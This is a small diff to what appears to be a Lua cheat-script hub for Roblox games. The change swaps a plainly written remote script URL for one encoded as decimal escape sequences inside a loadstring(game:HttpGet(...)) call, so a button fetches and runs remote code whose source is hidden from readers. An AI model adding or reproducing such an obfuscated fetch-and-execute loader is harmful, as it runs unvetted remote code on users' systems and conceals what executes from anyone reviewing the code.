@@ -451,8 +451,7 @@ local UITab1 = win:Tab("『Doors』",'6031097229')
 local about = UITab1:section("『Doors』",true)
 
 about:Button(" Doors20万年前脚本",function()
-getgenv().Spy="mspaint"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoXuAnZang/XKscript/refs/heads/main/DOORS.txt"))()
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\76\88\51\49\56\47\76\88\47\109\97\105\110\47\76\88\37\50\48\50\46\108\117\97\0"))()
 end)
 
 local UITab1 = win:Tab("『战争大亨』",'6031097229')
